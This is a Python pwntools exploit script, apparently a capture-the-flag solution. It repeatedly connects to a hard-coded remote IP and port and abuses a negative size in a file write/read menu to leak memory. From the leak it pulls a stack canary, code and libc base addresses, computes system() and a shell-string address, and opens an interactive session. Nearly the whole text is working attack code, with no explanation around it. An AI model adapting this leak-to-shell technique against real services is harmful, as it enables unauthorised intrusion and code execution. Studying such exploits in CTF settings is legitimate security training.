#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

#host = "10.211.55.6"
#port = 9999
host = "104.236.0.107"
port =11111
#for leak
for i in range(100):
    r = remote(host,port)
    def write(filename,s):
        s.recvuntil(">")
        s.sendline("1")
        s.recvuntil(":")
        s.sendline(filename)

    def read(filename,s):
        s.recvuntil(">")
        s.sendline("2")
        s.recvuntil(":")
        s.sendline(filename)

    def go_write(size,key,data,s):
        s.recvuntil(">")
        s.sendline("3")
        s.recvuntil(">")
        s.sendline(str(size))
        s.recvuntil(">")
        s.sendline(data)
        s.recvuntil(">")
        s.sendline(key)

    def go_read(filename,key,s):
        s.recvuntil(">")
        s.sendline("3")
        s.recvuntil(">")
        s.sendline(key)

    write("fuck",r)
    go_write(-1,"nogg", "/////140.112.16.130\x00"*0x260,r)
    try :
        read("ddaa",r)
        data = r.recvuntil("b1ba40d5b7d7dff4b5795bf0f81494e4")
	print data
        if "140.112.16.130" in data:
	    go_read("ddaa","fuck",r)
	    r.recvuntil(":")
	    r.recvuntil(":\n")
	    data = r.recvuntil("Now")
	    canary = u64(data[0x408:0x410])
	    code = u64(data[0x410:0x418]) - 0x1e70
	    libc = u64(data[0x418:0x420]) - 0x20830
	    print "libc:",hex(libc)
	    print "code:",hex(code)
	    print "canary:",hex(canary)
	    system = libc + 0x45390
	    sh = libc + 0x18cd57
            r.interactive()
        else :
            pass
    except EOFError :
        r.close()
        pass

